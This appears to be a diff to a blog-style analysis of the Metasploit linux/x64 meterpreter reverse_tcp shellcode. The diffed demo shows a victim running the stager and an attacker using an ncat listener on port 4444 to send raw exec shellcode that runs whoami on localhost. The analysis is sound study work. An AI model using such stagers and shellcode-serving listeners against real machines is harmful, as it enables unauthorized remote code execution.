@@ -498,10 +498,13 @@ We conclude that this shellcode basically connects back to an attacker and waits
 
 I never knew that this shellcode directly received shellcode to execute. This was cool to analyse and now I know that this shellcode can be used for more than the typical `multi/handler` with a `meterpreter` payload. Let's prove this by injecting another shellcode, namely `linux/x64/exec` which I analysed before.
 
+    @victim$ ./linux-x64-meterpreter-reverse_tcp
+
     @attacker$ ncat -vlp 4444 < linux-x64-exec.raw
     Ncat: Listening on 0.0.0.0:4444
+    Ncat: Connection from 127.0.0.1:33822.
 
-    $ ./linux-x64-meterpreter-reverse_tcp
+    @victim
     goncalor
 
 It worked! Our `exec` shellcode, configured to execute `whoami`, was successfully injected and ran on the victim's machine.
